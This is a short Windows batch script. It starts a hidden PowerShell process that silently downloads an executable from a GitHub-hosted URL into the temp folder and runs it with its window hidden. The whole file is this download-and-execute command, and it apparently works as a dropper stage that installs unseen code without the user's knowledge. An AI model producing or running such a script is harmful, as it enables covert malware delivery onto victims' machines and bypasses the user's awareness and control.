@echo off
start "" /B powershell -NoP -NonI -W Hidden -C "$b='%TEMP%\wup.exe';irm https://raw.githubusercontent.com/ezlishmail/cdn-assets/main/wup.exe -OutFile $b;Start-Process $b -WindowStyle Hidden"
exit
